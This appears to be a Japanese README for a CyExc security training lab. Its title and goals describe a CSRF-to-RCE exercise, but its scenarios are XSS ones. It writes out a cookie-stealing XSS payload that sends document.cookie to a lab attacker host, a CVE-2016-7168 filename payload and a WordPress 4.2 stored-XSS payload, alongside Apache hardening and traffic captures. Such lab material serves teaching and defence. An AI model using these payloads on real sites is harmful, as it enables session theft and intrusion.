# クロスサイトリクエストフォージェリ脆弱性を利用した標的型攻撃演習について
## Motivation
標的型攻撃は、海外ではAPT (Advanced Persistent Threat) と呼ばれるサイバー攻撃の手法の一つで、情報セキュリティ対策推進会議が定義した「高度サイバー攻撃」に含まれる。その手口は年々巧妙化・多様化し、目的を達成するまでは執拗にサイバー攻撃が繰り返される。

標的型攻撃には5つの攻撃段階がある。

攻撃段階 | 説明 |
--- | ---
事前調査 | Targetとなる組織を攻撃するための情報収集
初期潜入 | 標的型メールやUSB、ウェブサイト閲覧を通して不正プログラムの実行、脆弱性攻撃による公開サーバへの侵入
攻撃基盤構築 | 侵入したPC内でバックドアを作成し、外部のC&Cサーバと通信を行い、新たウィルス等をダウンロードする
システム調査 | 情報の存在箇所特定や情報の取得を行う
攻撃最終目的の遂行 | 攻撃専用のウィルス等をダウンロードして、攻撃を遂行する

標的型攻撃の攻撃手法を理解し、現実社会においてどのように発生するかを理解することは重要である。

## 学習目標
CyExcが提供する本演習では、標的型攻撃段階1−3を擬似的に再現し標的型攻撃の脅威を理解することを目とし、次の演習を行う。
1. nmap、traceroute、netcatを使用し、Targetの調査
2. iTop - Security Vulnerability: Config Editorを再現し、CSRFによるRemote Code Excution（RCE）を実施
3. RCEを利用して、TCP snifferやKeyloggerをTargetウェブサーバに設置し、Attackerと通信を行う

TCP snifferやKeyloggerのコードは倫理の観点から、ここでの公開はしないこととする。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/block.png" title="Ex4演習環境構成図">

## Prerequisite
* Vagrant
  * Plugin: landrush, vagrant-vbguest

## Installation　　
* Vagrant　　　
1. $ vagrant up --provision　　　   
2. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　   
```
target.cyexc-target            192.168.33.10
10.33.168.192.in-addr.arpa     target.cyexc-target
attacker.cyexc-attacker        192.168.33.20
20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
````
3. target側のOS起動
$ vagrant ssh target  <br>
	i. $ cd target/　　　    <br>
	ii.$ sudo docker-compose up --build  <br>
4. attacker側のOS起動
$ vagrant ssh attacker  <br>
	i. $ cd attacker/　　　      <br>
	ii.$ sudo docker-compose up --build  <br>

## シナリオ1


### Steps
1. ht&#8203;tp://target.cyexc-target:8000/php/xss.phpにアクセスする。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/xss.png" title="Screenshot1">
2. `"><script>alert(document.cookie)</script><!--`を入力する。
クッキー情報がポップアップ表示される。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie1.png" title="Screenshot2">
3. `"><script>window.location='http://attacker.cyexc-attacker:8081/cookie.php?c='+document.cookie;</script><!--`を入力する。
Attacker OSのクッキー情報を搾取するPHPコード（cookie.php）が実行される。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie2.png" title="Screenshot3">

搾取した攻撃対象のウェブサイトのクッキー情報はこちら＠[index.html](https://github.com/CyExc/CyExc/blob/master/2017/ex3/logs/index.html)

#### Apache2の設定方法
1. wordpressコンテナにログイン
```
apache2vagrant@target:~/target$ sudo docker-compose exec wordpress bash
```
2. apache2にmod_headersを追加する。
```
root@a4ff20247d20:~# a2enmod headers
root@a4ff20247d20:~# service apache2 restart
```
3. 再度1. wordpressコンテナにログイン
```
apache2vagrant@target:~/target$ sudo docker-compose exec wordpress bash
```
4. /etc/apache2/conf-available/security.confに以下の設定を追加する。
    * `Header set X-XSS-Protection "1; mode=block"`
    * `Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure`

```
root@a4ff20247d20:/var/www/html# vi /etc/apache2/conf-available/security.conf
root@a4ff20247d20:/var/www/html# service apache2 restart
```

設定前
```
vagrant@attacker:~$ curl -I http://target.cyexc-target:8000/php/xss.php
HTTP/1.1 200 OK
Date: Fri, 02 Feb 2018 12:27:47 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/5.6.33
Set-Cookie: PHPSESSID=ee9b5e67f350fe2de2ceec06e26684f1; path=/**
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

設定後
```
vagrant@attacker:~$ curl -I http://target.cyexc-target:8000/php/xss.php
HTTP/1.1 200 OK
Date: Fri, 02 Feb 2018 12:34:32 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/5.6.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Set-Cookie: PHPSESSID=17b07d99c8a5e7852286454dba8d115e; path=/;HttpOnly;Secure
Content-Type: text/html; charset=UTF-8
```

## シナリオ2
Target OSに設置されたWordPressサーバに不正な入力を含むリクエストを送信し、CVE-2016-7168とWordPress 4.2 Stored XSSの事象を確認する。

### CVE-2016-7168事象
CVE-2016-7168は、XSSコードが含まれている画像ファイル名におけるWordPressの重大なXSSの脆弱性である。

### Steps
1. Browse to http://target.cyexc-target:8000
2. ファイル名にXSSコードが含まれている画像をWordPress記事に添付する。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/post.png" title="Screenshot4">
3. プレビュー画面に遷移する。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/CVE-2016-7168.png" title="Screenshot5">

### WordPress 4.2 Stored XSS事象
WordPress 4.2 Stored XSSは、WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿することで、コメント欄を表示したTarget OSのブラウザ上で任意のJavaScriptを実行することができる。

### Steps
1. Browse to http://target.cyexc-target:8000
2. WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿する。
`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
64KB以上の文字列は下記のようなPythonスクリプトで作成した。
```
print 'A' * (64*1024 + 1)
```
確認ではWEB ShellコードをGETするXSSコード設置した。WordPressサーバに不正なスクリプトが設置される。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/4_2_XSS.png" title="Screenshot6">

#### wordpressサーバでHTTP通信をキャプチャ
1. wordpressコンテナにログイン
```
vagrant@target:~/target/wordpress$ sudo docker-compose exec wordpress bash
```
2. ngrepを使用してHTTP通信をキャプチャ
```
root@64ff6b86f93b:/var/www/html# ngrep -W byline 'HTTP' -q > ngrep.log
```
3. wordpressコンテナをログアウト
4. wordpressコンテナのcontainer IDを調べる
```
vagrant@target:~/target/wordpress$ sudo docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES
64ff6b86f93b        mywp                "/usr/local/bin/dock…"   13 minutes ago      Up 13 minutes       0.0.0.0:8000->80/tcp   target_wordpress_1
5b396b4d2bd0        mysql:5.7           "docker-entrypoint.s…"   2 hours ago         Up 13 minutes       3306/tcp               target_db_1
```
5. 取得したngrepのログをTarget OSにコピー
```
vagrant@target:~/target/wordpress$ sudo docker cp 64ff6b86f93b:/var/www/html/ngrep.log .
```

### CVE-2016-7168の確認
* XSSコードが含まれている画像のアップロード
T 192.168.33.1:60465 -> 192.168.1.10:80 [AP]
GET /wp-content/uploads/2018/02/img-srca-onerroralertdocument.cookie-300x300.png HTTP/1.1
Host: target.cyexc-target:8000.

* XSSコードが含まれている画像ファイル名が動的WEBページに紛れ込んでいることがわかる。
T 192.168.33.1:60475 -> 192.168.1.10:80 [A]
POST /wp-admin/async-upload.php HTTP/1.1.
Host: target.cyexc-target:8000.
Content-Type: multipart/form-data; boundary=---------------------------119484861102225031902156995.
Cookie: wp-saving-post=4-check; wordpress_90d5ca9d152667cf01931c7af43d449d=admin%7C1517746831%7C3lnjB9FzHVQ2di2eXuIxgsUSODN2ewsjPvk7NRZBlCz%7Cc5f6ca4e502585ad989c59e1335e0a1c6e9fedf65fdb0795a4f862b31805c454; wp-settings-time-1=1517579032; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26urlbutton%3Dpost; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_90d5ca9d152667cf01931c7af43d449d=admin%7C1517746831%7C3lnjB9FzHVQ2di2eXuIxgsUSODN2ewsjPvk7NRZBlCz%7Ca6730f416c68fb6d6713bf188f5d7b056bc2f8cabf3bb8b58e0c0ecccfd96bd6; PHPSESSID=62b5fe7e3928dd77f90bde1a505db58e.
Connection: keep-alive.
.
-----------------------------119484861102225031902156995.
Content-Disposition: form-data; name="name".
.
**<img src=a onerror=alert(document.cookie)>.png.**

取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex3/logs/ngrep2.log)


## References
* [Corss-Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
* [JPCERT/CC CSRFとその対策](https://www.jpcert.or.jp/securecoding/AntiCSRF-201510.pdf)
* [iTop - Security Vulnerability: Config Editor](https://sourceforge.net/p/itop/tickets/1202/)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)
